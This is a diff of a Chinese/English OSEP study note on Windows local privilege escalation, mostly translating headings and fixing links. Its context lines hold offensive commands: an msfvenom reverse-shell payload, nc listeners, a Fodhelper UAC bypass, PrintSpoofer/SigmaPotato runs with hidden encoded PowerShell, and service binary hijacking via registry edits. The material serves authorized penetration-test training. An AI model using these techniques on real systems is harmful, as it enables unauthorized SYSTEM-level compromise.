@@ -1,15 +1,11 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 06 — Windows privilege escalation
-
-whoami /all first. Filtered admin token → UAC. SeImpersonate → potato family. Writable service → hijack.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
+# 06 · UAC Bypass & Windows 本地提权（场景 25–27）
 
 > 技术路线对齐 （关键词：`UAC Bypass` `PrintSpoofer` `SigmaPotato` `FullPowers` `AlwaysInstallElevated` `Service Binary Hijacking`）。
-> 相关模块：本模块只讲「拿到第一段立足点之后的本地提权」。横向移动见 [15-winrm-lateral](/modules/15-winrm-lateral)，凭据抓取见 [07-credentials-lsass](/modules/07-credentials-lsass)。
+> 相关模块：本模块只讲「拿到第一段立足点之后的本地提权」。横向移动见 [15-winrm-lateral](/zh/modules/15-winrm-lateral)，凭据抓取见 [07-credentials-lsass](/zh/modules/07-credentials-lsass)。
 > 统一占位符：`LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`。
 
 三种提权形态在本模块的适用顺序（考试建议的排查顺序）：
@@ -28,9 +24,9 @@ sc qc <ServiceName>              # 之后场景 27 用
 
 ---
 
-## Scenario 25 · 未提升令牌 → Fodhelper 注册表 UAC Bypass
+## 场景 25 · 未提升令牌 → Fodhelper 注册表 UAC Bypass
 
-### Scenario回顾
+### 场景回顾
 已通过钓鱼/Webshell/凭据获得一枚**本地管理员组成员但未提升**的令牌（`whoami /groups` 里 `Mandatory Label\Medium Mandatory Level`，但用户属于 `BUILTIN\Administrators`）。目标是执行高权限（高完整性）命令，绕过 UAC。Windows 10/11 常见主机默认 `ConsentPromptBehaviorAdmin=5`（提示输入凭据）——能自动 UAC bypass 的前提是**用户已是管理员组成员**；若默认是 `EnableLUA=0` 或提示行为 = 每次都问（值 2），则不适用。
 
 ### 前提与假设
@@ -39,13 +35,13 @@ sc qc <ServiceName>              # 之后场景 27 用
 - 目标无完整杀软/EDR 阻止注册表写入或 spawn 行为（如存在，见失败分支）。
 - 考试中常见变体：Fodhelper、ComputerDefaults、wsreset、eventvwr（新版已修复/受路径影响）。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 ```bash
 # 1. 生成反向 shell 或 beacon
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f exe -o svc.exe   # 服务二进制示例
 # 或准备无文件第二阶段：m06-fodhelper-uac.ps1 内嵌 PAYLOAD 变量
 
-# 2. attacker box监听
+# 2. 攻击机监听
 nc -lvnp LPORT            # 或 msfconsole 的 handler / CS listener
 ```
 
@@ -73,7 +69,7 @@ reg delete "HKCU\Software\Classes\ms-settings" /f
 ### 用到的脚本
 - `m06-fodhelper-uac.ps1`
 
-### Verify
+### 验证
 - `whoami /groups` 在反弹 shell 中显示 `High Mandatory Level`；
 - `net session` 不报“拒绝访问”，或可读取管理员专属路径。
 
@@ -89,7 +85,7 @@ reg delete "HKCU\Software\Classes\ms-settings" /f
 ### 考试注意 OPSEC
 - **用后必清注册表键**（`reg delete`），否则该用户后续任何设置类操作都会再触发命令，留下持久化痕迹。
 - Fodhelper 触发时可能出现 UAC 弹窗闪烁——在交互会话中会被用户看到；若环境允许，优先非交互载荷 + 短命令。
-- 反弹连接统一走 `LHOST/LPORT`，别在命令里硬编码attacker box内网 IP（会被蓝队/EDR 关联）。
+- 反弹连接统一走 `LHOST/LPORT`，别在命令里硬编码攻击机内网 IP（会被蓝队/EDR 关联）。
 - 该场景拿到的还是**同一用户**的高完整性令牌，不是 SYSTEM——后续横向/提权别混淆。
 
 ---
@@ -189,25 +185,25 @@ Write-Log "[*] 验证：反弹/子进程里 whoami /groups 应显示 High Mandat
 Write-Log "[*] 失败排查：A) DelegateExecute 键是否写入成功  B) 换 -HostBin ComputerDefaults  C) 用户是否确为管理员组成员  D) 命令本身是否被杀软拦（先用 cmd /c whoami > 文件 验证高权限）"
 ````
 
-## Scenario 26 · SeImpersonate 令牌 → PrintSpoofer / SigmaPotato
+## 场景 26 · SeImpersonate 令牌 → PrintSpoofer / SigmaPotato
 
-### Scenario回顾
+### 场景回顾
 已获得一个**服务账户或本地服务上下文中可执行命令**的立足点（如 Webshell 以 IIS AppPool 身份、SQL Server 的 `xp_cmdshell`、Windows 服务本身），检查 `whoami /priv` 发现 `SeImpersonatePrivilege`（或 `SeAssignPrimaryTokenPrivilege`）。目标是拿到 `NT AUTHORITY\SYSTEM`。
 
 ### 前提与假设
 - 进程令牌带 `SeImpersonatePrivilege`（默认所有服务账户、IIS AppPool、MSSQL 服务账户都有）。
-- attacker box能访问目标上**可写目录**（放工具/二进制），或目标能出网下载。
-- 服务以 `LocalSystem`/`NetworkService`/`LocalService` 运行时，另一侧要能连回attacker box监听（PrintSpoofer 方式需要回连）或本机自回环（Potato 方式多不需要出网）。
+- 攻击机能访问目标上**可写目录**（放工具/二进制），或目标能出网下载。
+- 服务以 `LocalSystem`/`NetworkService`/`LocalService` 运行时，另一侧要能连回攻击机监听（PrintSpoofer 方式需要回连）或本机自回环（Potato 方式多不需要出网）。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 ```bash
 # PrintSpoofer（Windows 10/11 + Server 2016+，最稳）
 #  - 本地 https://github.com/itm4n/PrintSpoofer （发布二进制）
-# SigmaPotato（Potato 系现代版，Variant 1 = 本地，Variant 2/3 用 RPC 到attacker box）
+# SigmaPotato（Potato 系现代版，Variant 1 = 本地，Variant 2/3 用 RPC 到攻击机）
 #  - 本地 https://github.com/Kevin-Robertson/SigmaPotato
 # 自编译注意：C++ 项目在 VS 里 target x64，静态/动态选型按目标。
 
-# attacker box监听（PrintSpoofer 需要attacker box有监听；SigmaPotato 本地变体不需要）：
+# 攻击机监听（PrintSpoofer 需要攻击机有监听；SigmaPotato 本地变体不需要）：
 nc -lvnp LPORT
 ```
 
@@ -217,7 +213,7 @@ nc -lvnp LPORT
 whoami /priv
 
 # 1) 上传/落地工具（IIS AppPool 有写权限的目录、%TEMP% 均可）
-# 2) PrintSpoofer —— 本机提权，反弹到attacker box：
+# 2) PrintSpoofer —— 本机提权，反弹到攻击机：
 PrintSpoofer64.exe -i -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"   # -i 交互式（本机弹窗）
 PrintSpoofer64.exe -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"      # 或直接反弹
 
@@ -234,18 +230,18 @@ SigmaPotato.exe -cmd "powershell -nop -w hidden -enc <BASE64>"                  
 - `m06-sigmapotato-reflect.ps1`（离线自包含版本——不落地 EXE，用反射方式执行 SigmaPotato 的核心逻辑；同时是“自动工具失败时的手工备选”的载体）
 - 备选工具形态见文档：PrintSpoofer 二进制、JuicyPotato、RoguePotato、SpoolSample（打印假脱机诱导认证，见下）。
 
-### Verify
+### 验证
 - 执行后 `whoami` 返回 `nt authority\system`；
 - `whoami /groups` 中 `Mandatory Label\High Mandatory Level`（SYSTEM 恒为高）。
 
 ### 失败分支与备选
 1. **工具一运行就退出/无输出**：先查特权是否被**禁用**（`whoami /priv` 显示 Disabled）——服务账户令牌里的 SeImpersonate 常被禁用，用 FullPowers（GitHub itm4n/FullPowers）恢复或重提 token 后再打；也可检查目标系统版本与工具的兼容性（PrintSpoofer 需要 Server 2016/Win10 1607+；老系统换 JuicyPotato/RoguePotato）。
 2. **工具被杀软查杀/无法落地**：用 `m06-sigmapotato-reflect.ps1` 反射执行，或把工具编码后内存加载（见 M05/M01 思路）；再不行**手工**利用：用 .NET `DuplicateToken` + 创建带 SYSTEM token 的进程（脚本内给出最小实现）。
-3. **PrintSpoofer 需要回连但目标出网受限**：改 SigmaPotato/JuicyPotato 的本地回环变体（无需出网）；或诱导 SYSTEM 通过 SMB/HTTP 回连attacker box（SpoolSample + 中继，见 M16/M11 的 relay 思路）。
+3. **PrintSpoofer 需要回连但目标出网受限**：改 SigmaPotato/JuicyPotato 的本地回环变体（无需出网）；或诱导 SYSTEM 通过 SMB/HTTP 回连攻击机（SpoolSample + 中继，见 M16/M11 的 relay 思路）。
 4. **拿到的不是 SYSTEM 而是别的账户**：核对服务运行账户——`NetworkService` 下 PrintSpoofer 通常仍能提到 SYSTEM（打印池是 SYSTEM）；若服务是普通账户无 SeImpersonate，则此路不通，切场景 27。
 5. 工具需要 .NET/运行库：老系统先确认 PowerShell/.NET 版本（SigmaPotato 用 PowerShell 实现则无二进制依赖）。
 
-> SpoolSample（打印假脱机）在此场景的用法：它是**诱导认证**而非直接提权——让 `potato`/`printbug` 触发 SYSTEM 对被控机的认证，配合中继或 RPC 利用（典型是 Printerbug → Relay 到 LDAP/ADCS，见 [12-ad-attacks](/modules/12-ad-attacks) ESC8）。如果本机土豆路线全失败，这是考题的“备选路径”。
+> SpoolSample（打印假脱机）在此场景的用法：它是**诱导认证**而非直接提权——让 `potato`/`printbug` 触发 SYSTEM 对被控机的认证，配合中继或 RPC 利用（典型是 Printerbug → Relay 到 LDAP/ADCS，见 [12-ad-attacks](/zh/modules/12-ad-attacks) ESC8）。如果本机土豆路线全失败，这是考题的“备选路径”。
 
 ### 考试注意 OPSEC
 - 上传的 EXE 记得删或放到会被清理的目录；反射脚本不落盘是最干净的形态。
@@ -346,9 +342,9 @@ try {
 }
 ````
 
-## Scenario 27 · 手工服务二进制劫持（含回滚）
+## 场景 27 · 手工服务二进制劫持（含回滚）
 
-### Scenario回顾
+### 场景回顾
 拿到低权限立足点后，`sc qc` / `wmic service` 发现某个 Windows 服务：**二进制路径指向可写位置**，或**注册表 ImagePath 可改**，且服务可被（重新）启动/停止。目标：把服务二进制换成自己的 payload，等服务以 SYSTEM 启动 → 提权。
 
 ### 前提与假设
@@ -357,7 +353,7 @@ try {
 - 服务允许低权限用户 `start/stop`（`sc start` 不报拒绝访问），或依赖重启/崩溃自动拉起（考试环境多可直接重启服务）；
 - 已确认原服务不影响考试目标继续运行（破坏性最小原则，见回滚）。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 ```bash
 # 用 m06-service-binary-payload.c 编译 payload：
 #   x86_64-w64-mingw32-gcc -o svcpayload.exe m06-service-binary-payload.c   (Linux 交叉编译)
@@ -382,7 +378,7 @@ reg export "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" C:\Windows\Temp\<svc>-
 #    方式 A：目录可写 → 备份原 exe、放 payload
 copy /y "C:\Program Files\<vendor>\<svc>.exe" C:\Windows\Temp\<svc>.exe.bak
 copy /y C:\Windows\Temp\svcpayload.exe "C:\Program Files\<vendor>\<svc>.exe"
-#    方式 B：目录不可写但 ImagePath 可改（低版本/配置错误）→ 指向attacker box可控路径的 payload
+#    方式 B：目录不可写但 ImagePath 可改（低版本/配置错误）→ 指向攻击机可控路径的 payload
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\svcpayload.exe" /f
 #    方式 C（备选）：DLL 劫持——把恶意 DLL 放进服务目录并让其优先于原 DLL 加载（依赖已知缺失 DLL 时）
 
@@ -396,15 +392,15 @@ sc stop <svc>
 copy /y C:\Windows\Temp\<svc>.exe.bak "C:\Program Files\<vendor>\<svc>.exe"
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /f   # 若方式 B
 reg import C:\Windows\Temp\<svc>-backup.reg /y   # 若方式 A 且改过注册表
-sc start <svc>                                   # 恢复原服务（Verify能起）
+sc start <svc>                                   # 恢复原服务（验证能起）
 ```
 
 ### 用到的脚本
 - `m06-service-binary-payload.c`（服务 payload：启动后派生反连 shell 或加管理员，且可选地替身保持服务“活着”）
 - `m06-service-hijack.ps1`（保存/恢复原配置的完整劫持+回滚自动化）
 
-### Verify
-- 触发后attacker box监听收到 SYSTEM shell（`whoami` → `nt authority\system`）；
+### 验证
+- 触发后攻击机监听收到 SYSTEM shell（`whoami` → `nt authority\system`）；
 - 回滚后 `sc start <svc>` 成功、原进程正常。
 
 ### 失败分支与备选
@@ -640,4 +636,4 @@ Write-Log "[*] 若回滚时 exe 被占用（payload 进程还活着）：taskkil
 | SeImpersonate + 服务上下文 | PrintSpoofer → SigmaPotato（出网受限时）→ 老系统 JuicyPotato | `m06-sigmapotato-reflect.ps1` |
 | 可写服务二进制/ImagePath | 服务二进制劫持 + 注册表备份回滚 | `m06-service-binary-payload.c` + `m06-service-hijack.ps1` |
 
-提权后固定动作：`whoami /groups` 记录新完整性 → 如需凭据抓取见 [07-credentials-lsass](/modules/07-credentials-lsass) → 横向见 [15-winrm-lateral](/modules/15-winrm-lateral)。
+提权后固定动作：`whoami /groups` 记录新完整性 → 如需凭据抓取见 [07-credentials-lsass](/zh/modules/07-credentials-lsass) → 横向见 [15-winrm-lateral](/zh/modules/15-winrm-lateral)。
